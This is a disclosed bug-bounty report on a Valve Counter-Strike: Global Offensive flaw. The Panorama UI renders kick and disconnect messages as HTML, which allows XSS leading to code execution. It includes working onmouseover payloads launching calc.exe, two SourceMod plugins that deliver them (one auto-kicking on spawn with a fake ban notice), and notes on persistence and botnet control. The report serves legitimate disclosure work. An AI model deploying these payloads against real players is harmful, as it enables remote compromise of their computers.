---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/code-injection
  - env/web
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2019-10-08
submitted: 2019-06-29T07:04:48.145Z
bounty_usd: null
votes: 420
cve: []
program: "[[programs/valve|Valve]]"
reporter: "shayhelman"
source: "https://hackerone.com/reports/631956"
title: "Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message"
---
# Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 420 | **Program:** Valve | **Disclosed:** 2019-10-08

- Report: [https://hackerone.com/reports/631956](https://hackerone.com/reports/631956)
- CWE: Code Injection
- Submitted: 2019-06-29T07:04:48.145Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Overview
Counter-Strike: Global Offensive's UI is built of a framework called [Panorama](https://developer.valvesoftware.com/wiki/Dota_2_Workshop_Tools/Panorama) which is heavily influenced by modern HTML/CSS with JS capabilities. Because of these properties, the UI becomes easily vulnerable to different types of code injection, most notably XSS.

Previously, it was discovered that a certain message-type sent through the lobby chat allowed anyone to send raw HTML strings that would then be parsed by the Panorama framework as valid HTML. The reason this XSS was possible was because of a certain Panorama tag that was left enabled.

In order to see how these Panorama files are constructed, you must extract them from the CS:GO files. By unzipping the file under `steamapps\common\Counter-Strike Global Offensive\csgo\panorama\code.pbin`, a plethora of UI files are revealed. In these files we can see how this lobby XSS was possible by looking in the file named `panorama\layout\chat.xml` on line `18` we can see 
```
<Label html="true" text="&lt;span class='chat-entry__name'&gt;{s:player_name}&lt;/span&gt; {s:msg}" acceptsinput="true" />
```

By having `html="true"` in a Panorama tag, any input is parsed as raw HTML. This is what lead to the discovery of this exploit. We grepped through all the Panorama layout files looking for any that contained `html="true"` and within a few seconds we found a particular file with the name `panorama\layout\popups\popup_generic.xml`. We knew that the disconnect message was utilizing this exact file which is when we started to test.

Our first payload was testing if an image could load via a custom disconnect message. So we tried a simple payload `disconnect "<img src='https://i.imgur.com/IbJKM0M.jpg'>"`, and after running it twice (for caching purposes), the cat appeared to our surprise. {F518974}

Now that we knew disconnect popups were exploitable, we tried to see if this could be done remotely through the kick function. We tested first on local servers with the `kickid` command but had no luck. We then setup a dedicated server with SourceMod and attemped to kick with `sm_kick`. This worked at first but it had a character limit which did not allow much room for meaningful payloads. After reading through SourceMod documentation, we found a function called ` KickClient()` which did not have a character limit. After testing with some common payloads, we concluded that `<a onmouseover='javascript:CODE'></a>` is the best method with the least amount of user interaction to trigger code execution since the Panorama HTML parser is very limited in the amount of working tags and event listeners which is highlighted [here](https://developer.valvesoftware.com/wiki/Dota_2_Workshop_Tools/Panorama#.JS_.28Javascript.29).

## Steps to reproduce

* Setup a [dedicated CS:GO server](https://developer.valvesoftware.com/wiki/Counter-Strike:_Global_Offensive_Dedicated_Servers)
* Install [SourceMod](https://wiki.alliedmods.net/Installing_sourcemod) and [Metamod](https://www.sourcemm.net/)
* Download the attached SourceMod plugin and place it under `\addons\sourcemod\plugins\`: F518946
* Start up CS:GO and connect to the server
* Run this string in your client's console:
```
sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
```

* Mouse over the text `The remote host stopped receiving communications and closed the connection.`

## PoC

{F518945}
Triggered with the command:
```
sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
```

### SourceMod Kick Plugin Source F518946

```cpp
#include <sourcemod>

#pragma semicolon 1
#pragma newdecls required

public void OnPluginStart()
{
    RegConsoleCmd("sm_testkick", Cmd_Kick);
}

public Action Cmd_Kick(int client, int args)
{
    if (args <= 0) {
        PrintToChat(client, "No arguments provided - Usage: !testkick <Kick Message>");
        return Plugin_Handled;
    }

    char full[5120];
    GetCmdArgString(full, sizeof(full));

    for (int i = 0; i < 5; i++) {
        KickClient(client, full);
    }

    return Plugin_Handled;
}
```

## Impact

An attacker could achieve full system access to the victims computer. A dummy server can be setup with an autokick message containing the payload. The victim would just need to join the attackers server and they would become infected. Moreover, an attacker could trick a server owner into installing a malicious SourceMod plugin that would be able to deliver the malicious payload to anyone on the server.

Similar to #470520, the exploit can be triggered via browser by connecting the victim to an attacker controlled server.

This exploit could also be combined with any Panorama function present [here](https://developer.valvesoftware.com/wiki/CSGO_Panorama_API) in order to further mess with the game's functionality (such as starting and accepting a new match or displaying a custom popup message). The attacker virtually has full control over all UI features.

Even though the payload is only triggered via the `mouseover` event, because the way the message appears in the center of the victim's screen and the ability to fill the center of the screen with exploitable text, user interaction is negligible.

It is also possible to persist the Javascript code execution by hoisting a function to the scheduler. Eg. `$.Schedule(1, function)`. Furthermore, it is possible to set up a persistent remote connection to the victim's game instance by utilizing `eval()` and `$.AsyncWebRequest()` which would allow the attacker to manage multiple victims in some sort of botnet.

Yours respectfully,
Shay @shayhelman and Felix @dukebruno123

## Timeline

- **Report Filed**
- **2019-07-01** @orangeband: Hi @shayhelman,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@orangeband
- **Report Needs More Info**
- **Report New**
- **2019-07-03** @shayhelman: Regarding your comment on the auto-kick that an attacker would set up, we have made a plugin that will do just that. F521670
Again place the file in the SourceMod plugins folder and restart the server.

The plugin waits for the victim to choose a team and spawns in-game, then initiates a kick. This is done in order to ensure that the victim's mouse is already hovering over our payload, making this exploit require no user interaction to trigger.
```cpp
#include <sourcemod>

#pragma semicolon 1
#pragma newdecls required

// Create hook event for when a player spawns
public void OnPluginStart()
{
    HookEvent("player_spawned", Event_PlayerSpawned);
}

// When the event gets fired create a 0.1 second timer
public Action Event_PlayerSpawned(Event event, const char[] name, bool dontBroadcast)
{
    int userid = event.GetInt("userid");
    CreateTimer(0.1, DoKick, userid);
    return Plugin_Continue;
}

// Do the actual kick once the timer is over
public Action DoKick(Handle timer, int userid)
{
    // We have to validate the client before doing anything else we might crash
    int client = GetClientOfUserId(userid);
    if (client <= 0 || client > MAXPLAYERS || IsFakeClient(client)) {
        return Plugin_Continue;
    }

    // Kick with malicious message
    KickClient(client, "<a onmouseover=\"javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')\">-------------------------\nBANNED\n-------------------------\n\nYour account has been banned from this community.\n\nThe ban is non negotiable</a>");
    return Plugin_Continue;
}
```
Here is a video of the autokick in action:
{F521677}
- **2019-07-03** @h1_analyst_everton: @shayhelman 

Thanks for the added info. I'll escalate this to Valve's team and we will get back to you as soon as there are any updates.
- **2019-07-18** @shayhelman: Any updates on this issue? Also, will this report be marked as triaged?
- **2019-07-25** @shayhelman: Just to clarify, this report has been triaged correct? If so, will the status be changed as such?

Thank you,
shay
- **2019-08-01** @h1_analyst_ava: Hi @shayhelman,
The report is still under review by the internal team and has not been confirmed as valid yet. As soon as we can provide you with those updates we will let you know. Thank you for you patience on this.
@sodacan
- **2019-08-29** @shayhelman: Hello,

Any updates? I've noticed that this issue has been resolved in a recent update [here](https://blog.counter-strike.net/index.php/2019/08/25353/) but no response on this report.

Thanks,
shay
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **2019-10-08** @percybysshe: Hi, sorry for the late response on your disclosure request. If you use the h1 'request disclosure' feature you might get faster response on those than you get by leaving a comment.

After we ship a mitigation, we generally favor disclosing bugs. Just let us know if you have a timing request for disclosure or if we should just click the disclose button.
- **2019-10-08** @shayhelman: Hmm that's weird, on my end it shows as `shayhelman requested to disclose this report.` for the last comment I sent. The current option for this report is to cancel the disclosure request. Should I cancel and re-request the disclosure?
- **2019-10-08** @percybysshe: Oh whoops, you're totally right. That's an error on my part, I must have been looking at the wrong browser tab or something. In that case, apologies for sitting on it for so long.

Just let us know if you have any timing restrictions and we'll disclose.
- **2019-10-08** @shayhelman: I am fine if you disclose right now, thanks.
- **Agreed On Going Public**
- **Report Became Public**
